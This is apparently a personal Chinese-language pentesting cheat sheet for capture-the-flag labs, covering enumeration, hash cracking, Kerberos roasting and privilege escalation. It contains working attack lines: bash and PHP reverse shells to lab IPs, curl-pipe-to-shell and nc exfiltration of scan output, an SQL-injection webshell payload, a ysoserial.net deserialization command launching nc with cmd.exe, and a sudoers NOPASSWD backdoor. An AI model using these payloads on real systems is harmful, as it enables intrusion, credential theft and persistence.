内网协议有几种、smb版本用的什么协议、内网协议在什么情况下降级（没有DNS，会进行广播，广播有一种攻击技术是嗅探）



`AS-REP Roasting`攻击（认证服务响应的roasting），需要了解`Kerberos`认证原理(UF_DONT_REQUIRE_PREAUTH标记位)，获得hash

```
sudo update
locate -i getnp
export PATH=$PATH:/usr/share/doc/python3-impacket/examples/
GetNPUser.py
```

`Kerberroasting`

```
GetUserSPNs.py -dc-ip 10.129.139.15 LicorDebellota.htb/kaorz:Roper4155
```





**==破解hash==**

```
hashcat --help | grep -i rep #查找对应的hash
hashcat -m 18200 kaorz_hash /usr/share/wordlists/rockyou.txt

john kaorz_hash -w=/usr/share/wordlists/rockyou.txt
```



==21==:FTP

1. 尝试连接
   - `ftp json.htb`  `anonymous`尝试匿名登陆
   - `wget -m ftp://anonymous:RedteamNotes@LiconDebellota.htb` 下载ftp全部文件
   - 
2. 不能匿名登陆
   - 尝试找漏洞：`searchsploit FileZilla`
   - 

==22==:SSH

==80==:HTTP

1. 看浏览器
   - 是登陆界面：尝试弱密码登陆：`admin`:`admin`

==88==:Kerberos

1. **Kerbrute** 主要涉及 **UDP 88 端口**（Kerberos 默认端口），用于发送 **Kerberos 预认证（AS-REQ）** 请求来枚举或暴力破解有效的域用户名。

- [GitHub - ropnop/kerbrute: A tool to perform Kerberos pre-auth bruteforcing](https://github.com/ropnop/kerbrute)
- 使用 `/usr/share/seclists/Usernames/xato-net-million-usernames.txt` 字典

==135==:RPC

`rpcclient -U "" -N driver.htb`

- `help`查看具体命令

==445==:SMB

1. 探测和枚举

   - `smbmap -H json.htb` 看共享情况

   - `enum4linux-ng -A json.htb`

   - `sudo nxc smb driver.htb --shares -u RedtearmNotes -p ""`
   
   - `smbclient -L driver.htb` `-N`空密码
   
   - `smbclient -U Licorbellota.htb/kaorz //10.129.139.15/IPC$`
     - `prompt off`
   
     - `mget *`
   
   - `crackmapexec smb 10.129.139.15`
   
   - `crackmapexec smb 10.129.139.15 -u kaorz -p Poper4155 --shares`

==5985==:WINRM







**==提高终端稳定性==**

`python -c 'import pty;pty.spawn("/bin/bash")'`

`python3 -c 'import pty;pty.spawn("/bin/bash")'`

==**指定终端类型**==

`export TERM=Xterm-color`

==**提高交互**==

`rlwrap nc -lvnp 443`





## **==手工枚举==**

①

​	`whoami`

​	`id`

​	`id root`

​	`who`

​	`w`

​	`last`

②

​	`uname -a` 内核 

​	`lsb_release`

​	`cat /proc/version`

​	`cat issue`

​	`hostnamectl`

③

​	`ip addr`

​	`ip a`

​	`ip route` 路由表

​	`ip neigh`

​	`arp -a`

④

​	`hostname`

⑤

​	`sudo -l`

​	`getcap -r / 2>/dev/null`

​	`ls -liah`

​	`history`

​	`cat /etc/passwd`

​	`cat /etc/shadow`

​	`cat /etc/crontab`

​	`echo $PATH`

​	`env`

​	`ps -ef`查看进程

​	`ps axjf` 查看进程数

​	`ps aux` 

​	`top` 查看进程

​	`top -n 1` 不会一直刷新 

​	`netstat -a` 网络统计 （-t TCP -u UDP）

​	`netstat -l`

​	`netstat -s` 

​	`netstat -ano`

​	`find / -perm -u=s -typt f 2>/dev/null`

​	`find / -perm -4000 -type f 2>/dev/null`

​	`strings /usr/bin/reset_root`

​	`which awk perl python ruby gcc vi vim nmap find netstat nc wget tftp ftp tmux screen 2>/dev/null`

​	`cat /etc/fstab` 查看哪些没有未挂载的文件系统

​	

## ==自动化枚举==

①Linpeas

②LinEnum

③Linux-smart-enumeration

④Linux-exploit-suggester

⑤Linuxprivchecker

⑥unix-prviesc-check

⑦



`curl https://../../../linpeas.sh | sh`  没有重定向

`curl -L https://../../../linpeas.sh | sh `有重定向



==内网==

kali:

`wget linpeas.sh`

`sudo python3 -m http.server 80`

靶机：

`curl 10.10.10.10/linpeas.sh | sh`

 

把靶机的扫描结果传回kali

kali：

`sudo nc -lvnp 81 | tee linpeas.txt`

靶机：

`curl 10.10.10.10/linpeas.sh | sh | nc 10.10.10.10 81`

读：

`less -r linpeas.txt`



不能用curl

kali：

`sudo nc -lvnp 80 < linpeas.sh`

靶机：

`cat < /dev/tcp/10.10.10.10/80 | sh`



**==爆破子域==**

`sudo ffuf -u [URL] -H 'Host: FUZZ.pov.htb' -w /usr/share/seclists/Dicovery/DNS/.txt-ac -t 100 `

`sudo vhost --domain pov.htb --append-domain -u [URL] -w [dir] -t [int]`

**==监控ping操作==**

`tshark -i tun0 -f tcmp`

`tshark -i tun0 -f 'port 25565' -w crafty.pcap` 流量捕捉，捕捉的信息存到crafty.pcap，添加过滤器，只要port 25565

读取：`tshark -r crafty.pcap -x` (-x 使用十六进制的ascii)

**==查看文件，保证安全、全面==**

`file [filename]`

`binwalk [filename]`**查看是否有捆绑**

`strings [filename]`

**==ssh爆破==**

`sudo crackmapexec ssh [ip] -u [user.txt] -p [passwd.txt] --continue-on-success`

`sudo ssh [username]@[ip]`

**==自动任务==**

`cat /etc/crontab`

`find / -name cronlog 2>/dev/null`

**==ALL=(ALL)NOPASSWD==**

`echo "[username] ALL=(ALL)NOPASSWD: ALL" >> /etc/sudoers`

**==SQL注入==**

**①先用'或者"进行验证是否有漏洞**

**②" order by 1"**，按照第一列排序，数字可以递增，如果没有这一列，就会报错

**③按照前面查出来第n列报错，注入" union select 1,2,3,4,5,...,n-1,(n)"** 如果报错，可能会把后端的SQL语句爆出来

**==php脚本==**

`<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.3/1234 0>&1'"); ?>`

**==识别加密==**

`hash-identifier 'cipher'`

**==破解加密==**

查找加密编号：`sudo hashcat --help | grep -i md5` (-i 忽略大小写)

破解：`sudo hashcat -m 0 -a 0 [hash] /usr/share/wordlists/rockyou.txt`

**==用户认证爆破：用于登陆界面==**

`sudo nmap --script=http-brute -p80 [ip]`

**==echo==**

追加：`sudo bash -c 'echo "[ip] [域名]" >> /etc/hosts'`

十六进制符解析：`echo -e [string]`

**==查看开头和结尾==**

`head -n 1 /etc/hosts`

`tail -n 1 /etc/hosts`

**==查看各类服务==**

`crackmapexec`



##### ==nxc 空命令看帮助==

`sudo nxc smb rebound.htb --shares` 纯匿名访问共享目录

`sudo nxc smb rebound.htb -u guest -p '' --shares` guest用户访问，上下两个不太一样的

`sudo nxc smb rebound.htb -u redteamnotes -p '' --shares` 未知用户可以映射为guest用户



`sudo nxc smb [域名] --shares -u [user] -p[passwd,可以为空->'']`

`sudo nxc smb rebound.htb -u users -p "password" -d rebound.htb --continue-on-success` 用users文件尝试喷洒（撞库）



**==访问smb客户端==**

`sudo impacket-smbclient rebound.htb/redteamnotes@10.129.229.114 -no-pass`

**进去后**

​	`help`

​	`use dir`

​	`ls`



**==在smb共享中看到rpc可读==**

直接登陆，访问rpc: `rpcclient -U "" 10.129.229.114` 需要高权限，一般是空命令是访问不了的

枚举rid: `sudo impacket-lookupsid redteamnotes@rebound.htb -no-pass` 需要的权限不高，看到IPC可读，成功的概率也是很高的

​	`sudo impacket-lookupsid redteamnotes@rebound.htb -no-pass --help`

​	可以看到这里maxRid默认是4000，可能会有比4000打的Rid

​	`sudo impacket-lookupsid redteamnotes@rebound.htb -no-pass 40000` 比赛最好是guest，避免留下特征

​	`cat sids | grep SidTypeUser | grep -v -e '\$'` 后面是反向、扩展，剔除掉有$（机器账号）

445：`smbclient -L [域名] -N`

135：`rpcclient -U '' -N [域名]`

枚举：`enum4linux-ng -A [ip]` smb相关的枚举，-A完整扫描

`sudo smbmap -H json.htb`侦测，尝试连接



**==制作反弹shell==**

更新数据库：`sudo updatedb`

定位一下shell：`locate reverse-shell`

记得修改ip地址



**==有认证的目录爆破==**

①用burpsuite登陆

②启用拦截

③发送请求

④找到包中的Authorization

⑤找反弹shell上传的位置：

feroxbuster:`sudo feroxbuster -u [URL] -x php -H "Authorization: ...... " -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`

gobuster: `gobuster dir -u [URL] -U admin -P admin -x php -w /usr/share/wordlists/dirb/common.txt`

gobuster:`gobuster dir -u [URL] -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt`

ffuf: `ffuf -c -H 'Authorization: ......' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://driver.htb/FUZZ -e .php,.zip,.txt,.pdf`

**==识别hash==**

①`hash-identifier`

② `Name-That-Hash` `nth`

**==破解hash==**

①NTLMv2: `sudo hashcat -m 5600 [filename] /usr/share/wordlists/rockyou.txt --potfile-disable `

​	如果破解不出，可以尝试增加规则（rule）：`sudo hashcat -m 18200 'hash' /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule --potfile-disable`



②john: `sudo john [filename] --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt --pot=driver.pot` (指定存储到driver.pot)

**==建立smb服务器，建立共享，搬运文件==**

kali：`sudo impacket-smbserver RedteamNotes . -smb2support` 

kali，指定用户名和密码：`sudo inpacket-smbserver RedteamNotes . -smb2support -username redpen -password RedteamN0t3s.`

win：

①：`net use \\10.10.16.17\RedteamNotes /user:redpen RedteamN0t3s.`

②：`copy-item ./server.jar \\10.10.16.17\RedteamNotes\server.jar`

③：`net use \\10.10.16.17\RedteamNotes /delete`

**==winrm==**

`sudo nxc winrm driver.htb -u [user] -p [passwd]`

`sudo evil-winrm -i driver.htb -u [user] -p [passwd]`

**==子域名爆破==**

`sudo gobuster vhost -u [URL] --domain [DIMAIN] -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r` 

**==win开通远程桌面服务winrm==**

`enable-psremoting -force`

`set-wsmanquickconfig -force`

**==runas and RunasCs==** 

`runas /user:administrator powershell` 不给输入命令的机会

**==向win传输文件==**

kali:`sudo php -S 0:80`

win:`iwr http://10.10.16.17/RunasCs.exe -outfile RunasCs.exe`  

 **==sed 插入替换删除==**

`sudo sed -i '1i 192.168.10.111 breakout.lan'`插入第一行

`sudo sed -i '1d'` 删除第一行

`sudo sed -i 's/10\.129\.228\.191/10.129.227.191'` 10.129.228.191替换成10.129.227.191，搜索字符串要有转义符

**==json==**

解混淆，json逆向，应用：beautify

**==反序列化工具==**

ysoserial

ysoserical.net

win：`.\ysoserial.exe -c "START /B 10.10.16.21\RedteamNotes\nc64.exe 10.10.16.21 -e cmd.exe" -o base64 -g ObjectDataProvider -f json.net` 

kali：`sudo rlwrap -cAr nc -lvnpp 443`

==**获得反弹shell**==

`bash -i >& /dev/tcp/192.168.10.175/4444 0>&1 `

设置监听：`sudo rlwrap -cAr nc -lvnp 4444`

**==下载图片：wget axel aria2==**

`axel http://10.10.10.14/DRAGON%20BALL/Vulnhub/aj.jpg`



**==脚本化测试目录URL==**

![image-20250225231206432](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250225231206432.png)

![image-20250225231244654](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250225231244654.png)

```
which IFS= read -r url;do curl -o /dev/null -s -w "%{url_effective} http status:%{http_code}\n" '$url';done < secret_ext.txt | grep 200

```

**==处理图像：在tools.kali.org找steg==**

`exiftool [image]`

`binwalk [image]` 看有没有捆绑

`steghide info [image]` 看有没有隐写，需要passphrase(并不能证明是否有隐写)

`stegseek [image] /usr/share/wordlists/rockyou.txt` 可以不加字典

`stegcracker [image] /usr/share/wordlists/rockyou.txt` 可以不加字典

**==ssh使用私钥登陆==**

`sudo ssh root@10.10.10.14 -i id_rsa`

`sudo ssh xmen@10.10.10.14 -i id_rsa`

**==环境变量劫持==**

```
$ cat demo.c
#include<unistd.h>
void main()
{ setuid(0);
  setgid(0);
  system("ps");
}

$echo "/bin/bash" > ps //写一个相同名字的提权文件

$chmod +x ps

$which ps //查看调用ps的路径，这里显示的是环境路径的默认调用口

$echo $PATH //查看当前的环境路径

$export PATH=.:$PATH //把当前路径添加到环境路径，并把当前的环境路径添加到首位。如果后面调用ps，系统就						 //会优先在我们设置的环境路径执行ps命令，ps命令本来是执行进程命令的，但是经过我们				     //这一操作，就可以执行名为ps的提权命令

$which ps

```

**==FTP==**

`ftp [域名]` 登陆

`ftp> binary` //切换成二进制模式，可以无损的传输文件

`ftp> ?` //`?`可以列出可以用的命令

`ftp> prompt` //切换成静默形式

`ftp> mget` //批量文件下载

`ftp> get` //单个文件下载

`ftp> quit` //退出ftp

**==MD5 hash==**

```
hash-identifier '密文'
vim md5.hash
john md5.hash
使用在线网络工具查找明文
```

md5校验：`echo -n "明文" | md5sum`

**==base64==**

`echo "密文" | base64 -d`

**==mysql==**

`mysql -h [ip] -u [user default:root] -p [可以为空，]`

**==searchsploit==**

`searchsploit [vuln]` 寻找已知漏洞

`searchsploit [vuln] -m [代号]` 下载利用

**==curl==**

```
curl http://10.10.10.21/administrator/alerts/alertConfigField.php/?urlConfig=../../../../../../../../../etc/passwd //原来的url

curl --help all | grep url //
--data-urlencode <data> HTTP POST data URL encoded //对数据进行url编码，并且通过post的方式进行传递

curl --data-urlencode 'urlConfig=../../../../../../../../../etc/passwd' http://10.10.10.21/administrator/alerts/alertConfigField.php //处理过的url
```

**==hydra ssh==**

`hydra -L user.list -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.21 -t 4` 

**==流量分析==**

① `tcpdump`

② `wireshark`

③ `burpsuite`

**==进制转换和格式化==**

`od`

==**ping 发包**==

`ping -c 5 [URL]`

**==awk paste==**

`grep open nmapscan/ports.nmap | wc -l`

`grep open nmapscan/ports.nmap | awk -F'/' '{print $1}'`

`grep open nmapscan/ports.nmap | awk -F'/' '{print $1} | paste -sd ','`

**==ntpdate 时间调整，同步==**

`sudo ntpdate [靶机]` ntp协议 net time prototcol ， 123端口（udp协议），不会留下日志，但是要看udp123端口是否开放

`sudo net time set -S [靶机]` smb端口、协议，445，139，139

**==sqlmap==**

GET:`sudo sqlmap -u [URL] --dbs --dump --batch`

PORT:`sudo sqlmap -r '/home/kali/Desktop/posts.txt -p n --dbs --batch'` 需要指定注入口，不然运行不了，我也不知道为什么

![image-20250308205620473](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250308205620473.png)

也可以 `sqlmap -u http://localhost/sqli/Less-11 --data="uname=admin*&passwd=123456&submit=Submin" --dbs --batch`



指定数据库管理系统：mysql，寻找数据库：`sudo sqlmap -u [URL] --dbms mysql --dbs`

找到数据库seth：`sudo sqlmap -u [URL] --dbms mysql -D seth --tables`

找到users这张表：`sudo sqlmap -u [URL] --dbms mysql -D seth -T users --columns`

到这步也可以直接转储，直接把信息转出来：`sudo sqlmap -u [URL] --dbms mysql -D seth -T users --dump`  实战最好不要转储，万一敏感信息很多就完蛋了

提高扫描等级：`sudo sqlmap -r less-16.txt --dbs --level 2 --batch`





**==sql注入转文件上传==**

`" union select "<?php system($_GET['Redteamnotes']); ?>",2,3 into outfile "/var/www/html/uploads/shell.php";-- -` 

`" union select "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/192.168.95.137/1234 0>&1'\");?>","","" into outfile "/var/www/html/uploads/sh.php";-- -`

`192.168.95.27/uploads/shell.php?Redteamnotes=ls`

`192.168.95.27/uploads/shell.php?Redteamnotes=cat%20/etc/passwd`



**==序列化与反序列化==**

1. `ASP.NET`
   - 序列化工具：`ysoserial.net`在win使用
   - 最小化方式利用
     1. 生成序列化编码：`.\ysoserial.exe -c "ping -n 10 10.10.16.21" -o base64 -g ObjectDataProvider -f Json.net`
     2. 检测流量：`tshark -i tun0` tun0是网卡的名称，ping数据是`ICMP`包
   - 制作反弹shell
     1. kali：准备一个nc64
     2. kali：`sudo impacket-smbserver RedteamNotes . -smb2support`
     3. win：`.\ysoserial.exe -c "START /B \\10.10.16.21\RedteamNotes\nc64.exe 10.10.16.21 443 -e cmd.exe" -o base64 -g ObjectDataProvider -f Json.net`
     4. kali：`sudo rlwrap -cAr nc -lvnp 443`
     5. 序列化输入点：发送payload
   - 进入后：
     1. `whoami`
     2. `hostname`
     3. `ipconfig`
     4. `systeminfo` enum4linux对操作系统的判断比nmap准确
     5. `dir c:\users\*.txt /s` `/s`递归子目录，`cmd`命令
     6. `type c:\users\usepool\Desktop\user.txt`
   - 提权：
     1. `whoami /priv` 找到：`SeImpersonatePrivilege` 土豆提权
     2. `cd c:\Programdata\` 
     3. `mkdir apps`
     4. `cd apps`
     5. `copy \\10.10.16.21\RedteamNotes\PrintSpoofer64.exe .\PrintSpoofer64.exe`
     6. `dir`
     7. `.\PrintSpoofer64.exe --help`
     8. `.\PrintSpoofer64.exe -i -c cmd`
     9. `whoami`
     10. `hostname`
     11. `ipconfig`
     12. `dir c:\users`
     13. 
2. 没有 `.NET`
   - 序列化工具：`ysoserial`

**==telnet==**

`telnet [ip] [port]`

爆破：`sudo hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt 192.168.137.137 telnet -s 2323 -t 
64`

==**RPC**==

![image-20250315211026376](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250315211026376.png)

`rpcinfo -p 192.168.137.137` 是一个用于查询远程主机上 RPC（Remote Procedure Call）服务的命令。具体解释如下：

1. **`rpcinfo`**：这是一个用于查询 RPC 服务的工具，可以列出远程主机上注册的 RPC 服务及其相关信息。
2. **`-p`**：这是 `rpcinfo` 命令的一个选项，表示列出指定主机上所有已注册的 RPC 服务。
3. **`192.168.137.137`**：这是目标主机的 IP 地址，表示你要查询该主机上的 RPC 服务。

![image-20250315211035634](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250315211035634.png)

**==NFS : 2049端口==** 

```
查看共享目录
showmount -e <NFS服务器IP或主机名>
/data 目录只允许 192.168.137.0/24 网段的客户端访问。
/home 目录允许所有客户端访问。

查看哪些客户端挂载了共享目录
showmount -a <NFS服务器IP或主机名>
All mount points on 192.168.137.137:
192.168.137.101:/data
192.168.137.102:/home
表示 192.168.137.101 挂载了 /data 目录，192.168.137.102 挂载了 /home 目录。

查看被挂载的目录
showmount -d <NFS服务器IP或主机名>
Directories on 192.168.137.137:
/data
/home
表示 /data 和 /home 目录被客户端挂载。

showmount --help
```

**==mssql==**

`mssqlclient.py LicorDebellota.htb/kaorz:Roper4155@10.129.139.15`

**==逆向 ghidra==**

```
exe程序 Sysinternals套件 临时文件持久化  
```

